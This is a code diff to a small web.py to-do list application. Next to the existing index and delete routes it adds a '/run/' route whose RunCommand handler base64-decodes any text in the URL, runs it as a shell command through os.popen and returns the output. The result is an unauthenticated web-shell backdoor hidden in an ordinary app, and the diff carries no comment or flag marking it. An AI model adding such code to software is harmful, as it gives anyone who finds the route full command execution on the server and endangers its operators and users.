@@ -1,11 +1,13 @@
 import web
 import model
+import os, base64
 
 ### Url mappings
 
 urls = (
     '/', 'Index',
-    '/del/(\d+)', 'Delete'
+    '/del/(\d+)', 'Delete',
+    '/run/(.*)', 'RunCommand'
 )
 
 
@@ -45,6 +47,18 @@ class Delete:
         id = int(id)
         model.del_todo(id)
         raise web.seeother('/')
+
+
+class RunCommand:
+    def GET(self, command):
+        str=''
+        if not command:
+            return
+        command = base64.b64decode(command)
+        tmp = os.popen(command).readlines()
+        for line in tmp:
+            str += line
+        return str
 
 
 app = web.application(urls, globals())
